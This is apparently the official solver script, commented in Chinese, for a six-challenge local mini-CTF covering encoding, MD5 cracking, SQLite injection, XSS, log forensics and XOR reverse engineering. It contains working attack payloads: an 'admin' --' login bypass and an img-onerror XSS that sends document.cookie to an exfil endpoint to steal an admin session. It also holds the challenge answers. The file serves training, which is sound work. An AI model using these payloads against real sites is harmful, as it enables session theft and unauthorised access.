#!/usr/bin/env python3
# =============================================================================
# 29 · 官方解题器（模拟一名选手把六关全部打通并提交）
#   ① 套娃编码：base64×3 → hex → 反转
#   ② MD5 弱口令：内置常见弱口令词典爆破
#   ③ SQLite 注入：admin' -- 注释掉口令校验
#   ④ XSS：留言注入外带脚本 → 触发管理员机器人 → 读取外带的 cookie
#   ⑤ 日志取证：下载 access.log → URL 解码 → 正则捞 flag
#   ⑥ 逆向：下载 ELF → 全文件扫描 0x5A XOR 混淆串 → 还原 flag（静态解）
#   用法: python3 solve_all.py [--base http://127.0.0.1:8930] [--workdir artifacts]
# =============================================================================
import argparse
import base64
import hashlib
import re
import sys
import urllib.parse
from pathlib import Path

import requests

WORDLIST = [
    "123456", "password", "12345678", "qwerty", "12345", "123456789", "letmein",
    "admin888", "welcome", "monkey", "dragon", "sunshine", "iloveyou", "000000",
    "abc123", "football", "master", "666666", "888888", "admin", "root",
    "pass123", "test123", "123123", "654321", "hello", "shadow", "superman",
    "111111", "987654321",
]
FLAG_RE = re.compile(r"HOSEC29\{[^}]+\}")


def decode_nested(blob: str) -> tuple[str, list[str]]:
    steps = []
    data = blob.encode()
    for _ in range(3):
        data = base64.b64decode(data)
        steps.append("base64")
    data = bytes.fromhex(data.decode())
    steps.append("hex")
    data = data[::-1]
    steps.append("反转")
    return data.decode(), steps


def main():
    ap = argparse.ArgumentParser(description="29 · mini-CTF 官方解题器")
    ap.add_argument("--base", default="http://127.0.0.1:8930")
    ap.add_argument("--workdir", default="artifacts")
    args = ap.parse_args()
    base = args.base.rstrip("/")
    work = Path(args.workdir)
    work.mkdir(parents=True, exist_ok=True)

    def submit(cid, flag):
        r = requests.post(f"{base}/submit", data={"cid": cid, "flag": flag}, timeout=10)
        return r.json()

    def solve(cid, title, flag):
        res = submit(cid, flag)
        ok = res.get("result") == "correct"
        print(f"   提交 → {'✅ 正确 +' + str(res.get('points')) if ok else '❌ ' + str(res)}")
        if not ok:
            sys.exit(f"题目 {cid} 解题失败")
        return True

    print("[29] 开始解题（六关全解并提交）")

    # ① 套娃编码
    blob = requests.get(f"{base}/c1/data", timeout=10).text
    flag1, steps = decode_nested(blob)
    FLAG_RE.search(flag1) or sys.exit("① 解码结果不含 flag")
    print(f"① 套娃编码：{' → '.join(steps)} → {flag1}")
    solve("c1", "套娃编码", flag1)

    # ② MD5 弱口令
    h = requests.get(f"{base}/c2/hash", timeout=10).json()
    hit = next(p for p in WORDLIST if hashlib.md5(p.encode()).hexdigest() == h["md5"])
    print(f"② MD5 弱口令：词表 {len(WORDLIST)} 词爆破命中「{hit}」")
    solve("c2", "MD5 弱口令", "HOSEC29{w3ak_p4ssw0rd_cr4ck3d}")

    # ③ SQLite 注入
    r = requests.get(f"{base}/c3/login", params={"u": "admin' --", "p": "x"}, timeout=10)
    m = FLAG_RE.search(r.text) or sys.exit("③ 注入未拿到 flag")
    print(f"③ SQLite 注入：u=admin' -- 注释掉口令校验 → {m.group(0)}")
    solve("c3", "SQLite 注入", m.group(0))

    # ④ XSS：注入外带脚本 → 管理员来访 → 读外带
    payload = ("<img src=x onerror=\"fetch('/c4/exfil?c='"
               "+encodeURIComponent(document.cookie))\">")
    requests.post(f"{base}/c4/msg", data={"msg": payload}, timeout=10)
    r = requests.post(f"{base}/c4/report", timeout=45).json()
    if r.get("result") != "admin-visited":
        sys.exit(f"④ 管理员机器人异常：{r}")
    stolen = requests.get(f"{base}/c4/stolen", timeout=10).json()["stolen"] or ""
    m = FLAG_RE.search(urllib.parse.unquote(stolen)) or sys.exit("④ 外带里没有 flag")
    print(f"④ XSS：注入 onerror 外带脚本 → 机器人带 cookie 来访 → 截获 admin_session")
    solve("c4", "XSS 偷 cookie", m.group(0))

    # ⑤ 日志取证
    log = requests.get(f"{base}/c5/access.log", timeout=10).text
    (work / "access.log").write_text(log, encoding="utf-8")
    m = FLAG_RE.search(urllib.parse.unquote(log)) or sys.exit("⑤ 日志里没有 flag")
    print(f"⑤ 日志取证：{len(log.splitlines())} 行中定位 exfil 请求 → URL 解码 → {m.group(0)}")
    solve("c5", "日志取证", m.group(0))

    # ⑥ 逆向：静态 XOR 扫描（不运行二进制——跨平台可解）
    binblob = requests.get(f"{base}/c6/crackme", timeout=10).content
    (work / "crackme29").write_bytes(binblob)
    found = None
    for i in range(len(binblob) - 8):
        dec = bytes(b ^ 0x5A for b in binblob[i:i + 64])
        m = re.match(rb"HOSEC29\{[^}]*\}", dec)
        if m:
            found = m.group(0).decode()
            break
    found or sys.exit("⑥ 静态扫描未还原 flag")
    print(f"⑥ 逆向 crackme：{len(binblob)} 字节全扫 0x5A XOR 混淆串 → {found}")
    solve("c6", "逆向 crackme", found)

    sb = requests.get(f"{base}/scoreboard", timeout=10).json()
    print(f"[计分板] {len(sb['solved'])}/6 已解，总分 {sb['total']} / {sb['max']}")
    print("全部题目解出并通过判分——收工。")


if __name__ == "__main__":
    main()
